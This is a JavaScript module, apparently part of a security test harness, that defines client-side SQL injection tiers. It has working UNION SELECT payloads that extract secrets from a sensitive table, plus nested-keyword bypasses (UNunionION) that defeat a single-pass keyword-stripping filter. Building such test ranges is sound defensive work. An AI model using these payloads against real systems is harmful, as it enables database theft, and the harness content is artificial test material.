// Client-side SQL Injection — tiered.
// T0: the page's lookup JS concatenates input straight into the SELECT;
//     a UNION payload pivots onto the sensitive table and the canary
//     surfaces in the rendered results panel.
// T1: a client-side denylist strips UNION / -- / ; before the query is
//     built. A capable adversary bypasses by nesting the keyword inside
//     itself (UNunionION → UNION after the single-pass strip) and by
//     re-balancing the surrounding string quotes so no dash-dash
//     terminator is needed.
//
// No server WAF — the engine and the filter both live in the browser, so
// there's nothing on the wire for a network defence to inspect. RULE_POOL
// stays empty by design (kept exported so the runtime's defence machinery
// has a consistent surface across classes).

export const RULE_POOL = []

export const defences = {
  0: {
    canonicalPayload: (canary, scenario) =>
      `zzx' UNION SELECT id, account, secret FROM ${scenario.sensitiveTable} -- `,
    naiveBlockedExpected: false,
    bypassPayloads: [],
  },
  1: {
    // Canonical mirrors T0 intent; the T1 client filter strips the
    // tokens it knows about (union, --, ;), so a literal copy is gutted.
    canonicalPayload: (canary, scenario) =>
      `zzx' UNION SELECT id, account, secret FROM ${scenario.sensitiveTable} -- `,
    naiveBlockedExpected: true,
    bypassPayloads: [
      // Nested-keyword bypass: a single-pass strip of 'union' collapses
      // UNunionION back into UNION. Quotes are pre-balanced (closing the
      // outer LIKE early, opening a new LIKE on account at the end so the
      // template's trailing %' finishes a well-formed string), so no --
      // terminator is required.
      (canary, scenario) =>
        `' UNunionION SELECT id, account, secret FROM ${scenario.sensitiveTable} WHERE account LIKE '${scenario.canaryAccount}`,
      // Variant nested form with an always-true predicate — different
      // shape but same underlying observation that the filter is a single
      // literal-replace pass. Returns the whole sensitive table; the
      // canary row is among the results regardless of account targeting.
      (canary, scenario) =>
        `' UniunionON SELECT id, account, secret FROM ${scenario.sensitiveTable} WHERE 1=1 OR account LIKE 'x`,
    ],
  },
}

// No server-side defence config — the T1 filter lives in the served page
// JS, gated by manifest.defenceTier inside behaviour.mjs. Empty config
// keeps the generic inspector a no-op.
export function generateT1Config() { return {} }
